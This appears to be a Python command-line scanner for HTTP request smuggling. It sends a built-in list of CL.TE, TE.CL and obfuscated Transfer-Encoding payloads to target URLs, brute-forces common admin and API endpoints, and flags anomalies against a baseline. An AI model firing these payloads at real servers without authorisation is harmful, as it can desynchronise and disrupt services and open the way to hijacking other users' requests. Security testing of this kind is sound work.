#!/usr/bin/env python3
"""
Arul HTTP Smuggling Hunter
A professional CLI tool to scan for HTTP Request Smuggling vulnerabilities.
"""
import sys
import argparse
import requests
import textwrap
import time
from urllib.parse import urlparse
import subprocess
import shutil
from bs4 import BeautifulSoup
import webbrowser

# Smuggling payloads (CL.TE, TE.CL, etc.)
PAYLOADS = [
    # CL.TE
    {
        'desc': 'CL.TE (Content-Length + Transfer-Encoding: chunked)',
        'headers': [
            ('Content-Length', '6'),
            ('Transfer-Encoding', 'chunked')
        ],
        'body': '0\r\n\r\nG',
    },
    # TE.CL
    {
        'desc': 'TE.CL (Transfer-Encoding: chunked + Content-Length)',
        'headers': [
            ('Transfer-Encoding', 'chunked'),
            ('Content-Length', '4')
        ],
        'body': '0\r\n\r\n',
    },
    # TE.TE (duplicate Transfer-Encoding)
    {
        'desc': 'TE.TE (Duplicate Transfer-Encoding)',
        'headers': [
            ('Transfer-Encoding', 'chunked'),
            ('Transfer-Encoding', 'identity')
        ],
        'body': '0\r\n\r\n',
    },
    # Obfuscated Transfer-Encoding (space)
    {
        'desc': 'Obfuscated TE (Transfer-Encoding : chunked)',
        'headers': [
            ('Transfer-Encoding ', 'chunked'),
            ('Content-Length', '6')
        ],
        'body': '0\r\n\r\nG',
    },
    # Obfuscated Transfer-Encoding (tab)
    {
        'desc': 'Obfuscated TE (Transfer-Encoding\t: chunked)',
        'headers': [
            ('Transfer-Encoding\t:', 'chunked'),
            ('Content-Length', '6')
        ],
        'body': '0\r\n\r\nG',
    },
    # Mixed case Transfer-Encoding
    {
        'desc': 'Mixed Case TE (transfer-encoding: chunked)',
        'headers': [
            ('transfer-encoding', 'chunked'),
            ('Content-Length', '6')
        ],
        'body': '0\r\n\r\nG',
    },
    # Double chunk
    {
        'desc': 'Double Chunk (two chunked bodies)',
        'headers': [
            ('Transfer-Encoding', 'chunked'),
            ('Content-Length', '20')
        ],
        'body': '0\r\n\r\n0\r\n\r\n',
    },
    # Incomplete chunk
    {
        'desc': 'Incomplete Chunk (chunked, missing end)',
        'headers': [
            ('Transfer-Encoding', 'chunked'),
            ('Content-Length', '6')
        ],
        'body': '5\r\nhello\r\n',
    },
]

green = '\033[92m'
reset = '\033[0m'
BANNER = f"""{green}.────────────────────────────────────────────────────────.
|  Tool    : Automated HTTP Request Smuggling Scanner 👾                   
|  Author  : @ArulPrakash 🎖️
|  Codename: Arul Hunter 3
'────────────────────────────────────────────────────────'

                  ^   (\\_/)
                  '---(O.o)  
                      (> <)   [Ready to Hunt!]{reset}"""
print("\n" * 2)
# Helper to print request/response side by side
def print_repeater_style(request, response, status, payload_desc, vulnerable=False, reason=None):
    req_lines = request.split('\n')
    resp_lines = response.split('\n')
    max_lines = max(len(req_lines), len(resp_lines))
    width = 55
    border_color = '\033[91m' if vulnerable else '\033[96m'
    label = ''
    if vulnerable:
        label = '\033[91m[!!] VULNERABLE\033[0m\n'
        if reason:
            label += f"\033[91m[Reason] {reason}\033[0m\n\033[1m[CONFIRMED: This request is likely vulnerable due to the above reason(s).]\033[0m\n"
    else:
        label = '\033[92m[OK] Not Vulnerable\033[0m\n'
    print(f"{border_color}{'='*120}\033[0m")
    if label:
        print(label)
    print(f"\033[1m[Payload: {payload_desc}]\033[0m\n")
    print(f"\033[94m{'HTTP REQUEST'.ljust(width)} | {'HTTP RESPONSE'.ljust(width)}\033[0m")
    print(f"{'-'*width} | {'-'*width}")
    for i in range(max_lines):
        left = req_lines[i] if i < len(req_lines) else ''
        right = resp_lines[i] if i < len(resp_lines) else ''
        print(f"{left.ljust(width)} | {right.ljust(width)}")
    print(f"\033[93m{'-'*width} | {'-'*width}\033[0m")
    print(f"\033[92m[Status Code: {status}]\033[0m\n")
    print(f"{border_color}{'='*120}\033[0m\n")

# Build raw HTTP request string
def build_raw_request(url, method, headers, body):
    parsed = urlparse(url)
    path = parsed.path or '/'
    if parsed.query:
        path += '?' + parsed.query
    req = f"{method} {path} HTTP/1.1\r\nHost: {parsed.netloc}\r\n"
    for k, v in headers:
        req += f"{k}: {v}\r\n"
    req += "Connection: close\r\n"
    req += "\r\n"
    req += body
    return req.replace('\r', '').replace('\n', '\n')

def get_baseline_response(url, method):
    try:
        start = time.time()
        if method == 'POST':
            resp = requests.post(url, data='baseline=1', timeout=10, allow_redirects=False)
        else:
            resp = requests.get(url, params={'baseline': '1'}, timeout=10, allow_redirects=False)
        elapsed = time.time() - start
        baseline = {
            'status': resp.status_code,
            'headers': dict(resp.headers),
            'body': resp.text[:500],
            'elapsed': elapsed
        }
        return baseline
    except Exception:
        return None

def is_meaningful_diff(baseline, resp, elapsed):
    reasons = []
    
    # Only flag significant status code changes (not common errors)
    if resp.status_code != baseline['status']:
        # Don't flag 400 as vulnerable unless baseline was 200
        if baseline['status'] == 200 and resp.status_code in [502, 503, 504]:
            reasons.append(f"Status changed from {baseline['status']} to {resp.status_code}")
    
    # Significant timing differences (more than 5 seconds)
    if abs(elapsed - baseline['elapsed']) > 5:
        reasons.append(f"Significant timing diff ({elapsed:.2f}s vs {baseline['elapsed']:.2f}s)")
    
    # Compare headers for smuggling indicators
    ignore_headers = {'date', 'set-cookie', 'expires', 'content-length', 'server'}
    for k, v in resp.headers.items():
        if k.lower() not in ignore_headers and baseline['headers'].get(k) != v:
            # Only flag if it's a significant header change
            if k.lower() in ['transfer-encoding', 'content-encoding']:
                reasons.append(f"Critical header change {k}: {v} != baseline {baseline['headers'].get(k)}")
    
    # Look for specific smuggling indicators in response body
    response_lower = resp.text.lower()
    baseline_lower = baseline['body'].lower()
    
    # Only flag if response contains specific smuggling error messages
    smuggling_indicators = [
        'invalid chunk size',
        'chunk encoding error', 
        'transfer encoding error',
        'malformed chunk',
        'request entity too large',
        'bad chunk encoding'
    ]
    
    for indicator in smuggling_indicators:
        if indicator in response_lower and indicator not in baseline_lower:
            reasons.append(f"Smuggling indicator found: {indicator}")
    
    return reasons

def send_with_curl(url, headers, body):
    parsed = urlparse(url)
    curl_cmd = [
        'curl', '-i', '--raw', '-s', '-X', 'POST', url,
        '--max-time', '15', '--connect-timeout', '10',
        '--http1.1', '--no-buffer'
    ]
    for k, v in headers:
        curl_cmd += ['-H', f'{k}: {v}']
    curl_cmd += ['--data-binary', body]
    
    try:
        print(f"\033[93m[CURL COMMAND]\033[0m {' '.join(curl_cmd)}")
        result = subprocess.run(curl_cmd, capture_output=True, text=True, timeout=20)
        
        if result.returncode != 0:
            error_msg = f'[CURL ERROR] Return code: {result.returncode}'
            if result.stderr:
                error_msg += f', Error: {result.stderr.strip()}'
            return error_msg, ' '.join(curl_cmd)
        
        response_text = result.stdout
        if not response_text.strip():
            response_text = '[EMPTY RESPONSE]'
            if result.stderr:
                response_text += f'\n[STDERR]: {result.stderr.strip()}'
        
        return response_text, ' '.join(curl_cmd)
        
    except subprocess.TimeoutExpired:
        return '[ERROR] curl command timed out (20s)', ' '.join(curl_cmd)
    except Exception as e:
        return f'[ERROR] curl failed: {str(e)}', ' '.join(curl_cmd)

def parse_curl_response(response_text, baseline_status=None):
    """Parse curl response with more accurate vulnerability detection"""
    status = 'N/A'
    vulnerable = False
    reasons = []
    
    if '[ERROR]' in response_text or '[CURL ERROR]' in response_text:
        # Only flag connection errors if they're unusual
        if 'timed out' in response_text:
            vulnerable = True
            reasons.append("Request timeout (possible desync)")
        return status, vulnerable, reasons
    
    lines = response_text.splitlines()
    
    # Extract status code
    for line in lines:
        if line.startswith('HTTP/'):
            try:
                status = line.split()[1]
                status_code = int(status)
                
                # More specific vulnerability detection
                if baseline_status:
                    # Only flag if status changed from 200 to server error
                    if baseline_status == 200 and status_code in [502, 503, 504]:
                        vulnerable = True
                        reasons.append(f"Status changed from {baseline_status} to {status_code}")
                else:
                    # Without baseline, only flag severe server errors
                    if status_code in [502, 503, 504]:
                        vulnerable = True
                        reasons.append(f"Server error: {status_code}")
                break
            except (IndexError, ValueError):
                status = 'PARSE_ERROR'
    
    # Check for specific smuggling error messages (not generic 400 errors)
    response_lower = response_text.lower()
    specific_smuggling_errors = [
        'invalid chunk size',
        'chunk encoding error',
        'transfer encoding error', 
        'malformed chunk',
        'bad chunk encoding',
        'request entity too large and chunked',
        'chunked encoding not allowed'
    ]
    
    for error in specific_smuggling_errors:
        if error in response_lower:
            vulnerable = True
            reasons.append(f"Specific smuggling error: {error}")
    
    # Check for desync indicators (multiple responses, unexpected content)
    if response_text.count('HTTP/') > 1:
        vulnerable = True
        reasons.append("Multiple HTTP responses detected (possible desync)")
    
    # Check for extremely short responses (connection drops)
    if len(response_text.strip()) < 20 and '[ERROR]' not in response_text:
        vulnerable = True
        reasons.append("Extremely short response (possible connection drop)")
    
    return status, vulnerable, reasons

# Send smuggling payloads and print repeater-style logs
def scan_url(url, use_curl=False):
    print(f"\033[95m[~] Scanning: {url}\033[0m")
    findings = []
    
    # Get baseline first
    baseline_status = None
    if use_curl:
        try:
            baseline_resp = requests.get(url, timeout=10)
            baseline_status = baseline_resp.status_code
        except:
            baseline_status = None
    
    for method in ['POST', 'GET']:
        print(f"\033[96m[~] Using {method} method\033[0m")
        print("\033[94m[~] Payloads to be tried:\033[0m")
        for payload in PAYLOADS:
            print(f"   \033[92m[*]\033[0m \033[1m{payload['desc']}\033[0m")
        print("\033[96m" + "="*60 + "\033[0m")
        
        baseline = get_baseline_response(url, method) if not use_curl else None
        if not baseline and not use_curl:
            print(f"\033[91m[ERROR] Could not get baseline response for {method}. Skipping this method.\033[0m")
            continue
            
        for payload in PAYLOADS:
            headers = {k: v for k, v in payload['headers']}
            try:
                raw_req = build_raw_request(url, method, payload['headers'], payload['body'])
                if use_curl:
                    print(f"\033[93m[>]\033[0m \033[1mTrying payload:\033[0m \033[92m{payload['desc']}\033[0m \033[90m({method})\033[0m")
                    resp_text, curl_cmd = send_with_curl(url, payload['headers'], payload['body'])
                    
                    # Parse response with baseline
                    status, vulnerable, reasons = parse_curl_response(resp_text, baseline_status)
                    reason_str = ', '.join(reasons) if reasons else None
                    
                    print_repeater_style(raw_req, resp_text, status, f"{payload['desc']} [{method}]", vulnerable=vulnerable, reason=reason_str)
                    
                    if vulnerable:
                        print(f"\033[91m[!!] POTENTIAL VULNERABILITY DETECTED: {reason_str}\033[0m")
                        findings.append((f"{payload['desc']} [{method}]", url, status, 0, reason_str))
                    else:
                        print(f"\033[92m[OK] No vulnerability detected\033[0m")
                    
                    print("\033[90m" + "-"*60 + "\033[0m")
                    continue
                
                # Send using requests
                start = time.time()
                if method == 'POST':
                    resp = requests.post(url, headers=headers, data=payload['body'], timeout=10, allow_redirects=False)
                else:
                    resp = requests.get(url, headers=headers, params={'payload': payload['body']}, timeout=10, allow_redirects=False)
                elapsed = time.time() - start
                
                # More accurate detection
                diff_reasons = is_meaningful_diff(baseline, resp, elapsed)
                anomaly = len(diff_reasons) > 0
                
                # Additional checks for severe timing anomalies
                if elapsed > 10:  # Very slow response
                    diff_reasons.append(f"Very slow response ({elapsed:.2f}s)")
                    anomaly = True
                
                reason_str = ', '.join(diff_reasons) if diff_reasons else None
                
                # Build response text for display
                resp_text = f"HTTP/1.1 {resp.status_code} {resp.reason}\n"
                for k, v in resp.headers.items():
                    resp_text += f"{k}: {v}\n"
                resp_text += "\n" + resp.text[:500]
                
                print_repeater_style(raw_req, resp_text, resp.status_code, f"{payload['desc']} [{method}]", vulnerable=anomaly, reason=reason_str)
                
                if anomaly:
                    print(f"\033[91m[!!] VULNERABLE: {payload['desc']} [{method}] | {url} | Reason: {reason_str}\033[0m")
                    findings.append((f"{payload['desc']} [{method}]", url, resp.status_code, elapsed, reason_str))
                else:
                    print(f"\033[92m[OK] Not Vulnerable:\033[0m {payload['desc']} [{method}] | {url}")
            except Exception as e:
                print(f"\033[91m[ERROR] {e}\033[0m")
    return findings

COMMON_ENDPOINTS = [
    '/admin', '/login', '/logout', '/register', '/signup', '/signin', '/dashboard', '/api', '/api/v1', '/api/v2', '/upload', '/uploads', '/file', '/files', '/user', '/users', '/account', '/accounts', '/settings', '/config', '/panel', '/manage', '/management', '/cms', '/system', '/data', '/search', '/reset', '/forgot', '/password', '/change', '/update', '/edit', '/post', '/posts', '/comment', '/comments', '/feed', '/feeds', '/news', '/article', '/articles', '/product', '/products', '/cart', '/checkout', '/order', '/orders', '/pay', '/payment', '/admin/login', '/admin/dashboard', '/admin/panel', '/admin/config', '/admin/settings', '/admin/manage', '/admin/system', '/admin/data', '/admin/user', '/admin/users', '/admin/account', '/admin/accounts', '/admin/upload', '/admin/uploads', '/admin/file', '/admin/files', '/admin/api', '/admin/api/v1', '/admin/api/v2', '/admin/search', '/admin/reset', '/admin/forgot', '/admin/password', '/admin/change', '/admin/update', '/admin/edit', '/admin/post', '/admin/posts', '/admin/comment', '/admin/comments', '/admin/feed', '/admin/feeds', '/admin/news', '/admin/article', '/admin/articles', '/admin/product', '/admin/products', '/admin/cart', '/admin/checkout', '/admin/order', '/admin/orders', '/admin/pay', '/admin/payment'
]

def discover_endpoints(base_url):
    print(f"\033[96m[~] Discovering endpoints for: {base_url}\033[0m")
    endpoints = set()
    try:
        resp = requests.get(base_url, timeout=10)
        soup = BeautifulSoup(resp.text, 'html.parser')
        # Find all href links
        for tag in soup.find_all('a', href=True):
            href = tag['href']
            if href.startswith('http'):
                if base_url in href:
                    endpoints.add(href)
            elif href.startswith('/'):
                endpoints.add(base_url.rstrip('/') + href)
        # Find all forms
        for form in soup.find_all('form', action=True):
            action = form['action']
            if action.startswith('http'):
                if base_url in action:
                    endpoints.add(action)
            elif action.startswith('/'):
                endpoints.add(base_url.rstrip('/') + action)
    except Exception as e:
        print(f"\033[91m[ERROR] Could not crawl {base_url}: {e}\033[0m")
    # Always include the base URL itself
    endpoints.add(base_url)
    # Brute-force common endpoints
    parsed = urlparse(base_url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    for ep in COMMON_ENDPOINTS:
        endpoints.add(base + ep)
    print(f"\033[96m[~] Discovered endpoints (crawled + brute-forced):\033[0m")
    for ep in endpoints:
        print(f"  - {ep}")
    return list(endpoints)

# Interactive CLI
def main():
    print(BANNER)
    print("\033[1mInstagram: \033]8;;https://www.instagram.com/a_r_u_l._._?igsh=Mm95NzRsNjV5NHph\033\\@a_r_u_l._._\033]8;;\033\\   GitHub: \033]8;;https://github.com/ArulprakashAP01\033\\@ArulPrakashAP01\033]8;;\033\\\033[0m")
    print("\n" * 2)
    print("\033[1mWelcome to Arul HTTP Smuggling Hunter!\033[0m\n")
    print("Choose scan mode:")
    print("  1) Single URL")
    print("  2) Multiple URLs (from file)")
    mode = input("Enter 1 or 2: ").strip()
    urls = []
    if mode == '1':
        url = input("Enter the target URL (e.g., https://example.com/): ").strip()
        urls = [url]
    elif mode == '2':
        file_path = input("Enter the path to the file with URLs: ").strip()
        try:
            with open(file_path, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"\033[91m[ERROR] Could not read file: {e}\033[0m")
            sys.exit(1)
    else:
        print("\033[91m[ERROR] Invalid mode. Exiting.\033[0m")
        sys.exit(1)

    use_curl = False
    if shutil.which('curl'):
        use_curl_input = input("Use curl for raw HTTP requests? (y/N): ").strip().lower()
        if use_curl_input == 'y':
            use_curl = True
            print("\033[93m[!] Using curl for all HTTP requests.\033[0m")
        else:
            print("\033[92m[+] Using Python requests library for all HTTP requests.\033[0m")
    else:
        print("\033[93m[!] curl not found, using requests library.\033[0m")

    all_findings = []
    print("\n\033[1mStarting scan...\033[0m\n")
    for url in urls:
        findings = scan_url(url, use_curl=use_curl)
        all_findings.extend(findings)
        time.sleep(0.5)

    print("\n\033[1m--- Scan Summary ---\033[0m")
    if not all_findings:
        print("\033[92m[+] No obvious HTTP Request Smuggling vulnerabilities detected.\033[0m")
    else:
        print(f"\033[91m{'Payload':<30} | {'URL':<40} | {'Status':<6} | {'Time':<6} | Reason\033[0m")
        print(f"{'-'*30} | {'-'*40} | {'-'*6} | {'-'*6} | {'-'*20}")
        for desc, url, status, elapsed, reason in all_findings:
            print(f"\033[91m{desc:<30} | {url:<40} | {status:<6} | {elapsed:<6.2f} | {reason}\033[0m")

if __name__ == "__main__":
    main()
